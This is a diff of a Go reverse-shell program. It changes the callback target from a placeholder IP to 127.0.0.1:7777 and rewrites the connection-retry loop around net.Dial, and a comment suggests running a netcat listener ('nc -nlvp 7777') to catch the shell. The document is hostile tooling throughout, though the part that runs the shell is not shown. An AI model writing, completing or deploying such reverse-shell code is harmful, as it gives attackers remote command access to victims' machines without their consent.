@@ -9,11 +9,7 @@ import (
 )
 
 func main() {
-	reverse_shell("AAA.AAA.AAA.AAA", "7777")
-}
-
-func pid() {
-
+	reverse_shell("127.0.0.1", "7777")
 }
 
 // Function of the reverse shell, format IP:PORT in arg
@@ -34,7 +30,12 @@ func reverse_shell(host string, port string) {
 		for i < 5 { // For loop to retry connexion for 5 times before exiting
 			fmt.Fprintf(stderr, "Host connexion impossible\nTo try in local, you can : nc -nlvp 7777\n")
 			time.Sleep(2 * time.Second)
-			reverse_shell(host, port)
+			conn, err := net.Dial("tcp", full_conn) // TCP call on IP:PORT
+			if err != nil {                         // Errors verification
+				if nil != conn {
+					conn.Close() // Close connexion in case of error
+				}
+			}
 			i++
 		}
 		fmt.Fprintf(stderr, "EXITING - 5 failed connexions\n")
